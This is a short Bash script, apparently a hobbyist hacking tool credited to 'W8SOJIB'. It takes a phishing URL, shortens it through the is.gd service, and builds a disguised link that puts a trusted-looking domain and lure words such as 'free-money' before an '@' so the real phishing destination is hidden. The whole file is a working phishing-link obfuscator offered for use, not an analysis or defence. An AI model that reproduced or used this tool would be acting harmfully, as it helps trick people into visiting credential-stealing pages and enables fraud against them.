# Bash Script for Hide Phishing URL Created by W8SOJIB

url_checker() {
    if [ ! "${1//:*}" = http ]; then
        if [ ! "${1//:*}" = https ]; then
            echo -e "\e[31m[!] Invalid URL. Please use http or https.\e[0m"
            exit 1
        fi
    fi
}

echo ""
echo ""
echo -e " \e[92m  W8-Url Mask
                                                                   \e[33mV1 "
echo ""
echo ""
echo -e " \e[1m          \e[1;91m [\e[1;96m*\e[1;91m] \e[1;97mYouTube  \e[1;91m= \e[5m \e[1;97mWaitVai  "
echo ""
echo -e " \e[5m         \e[25m \e[1;91m [\e[1;96m*\e[1;91m] \e[1;97mWebsite  \e[1;91m=  \e[4m\e[1;97mwww.w8sojib.ml\e[24m   "
echo ""
echo -e " \e[1m          \e[1;91m [\e[1;96m*\e[1;91m] \e[1;97mFacebook \e[5m\e[1;91m=  \e[1;97mMd Sojib Khan   \e[93m   "
echo ""
echo "" 
echo -n "Paste Phishing URL here (with http or https): "
read phish
url_checker $phish
sleep 1
echo "Processing and Modifing Phishing URL"
echo ""
short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${phish})
shorter=${short#https://}
echo -e ""
echo -e 'Domain to mask the Phishing URL \e[91m(Ex:\e[96m https://google.com , http://anything.org)\e[0m :'
echo -en "\e[32m=>\e[0m "
read mask
url_checker $mask
echo -e '\nType social engineering words \e[91m(Ex:\e[96m like, free-money, best-pubg-tricks)'
echo -e "\e[93mDon't use space just use '-' between social engineering words\e[0m"
echo -en "\e[32m=>\e[0m "
read words
echo -e "\n\e[95mGenerating Masking Online Hacking Link...\e[0m\n"
final=$mask-$words@$shorter
echo -e "Here is the Masking OH URL:\e[32m ${final} \e[0m\n"
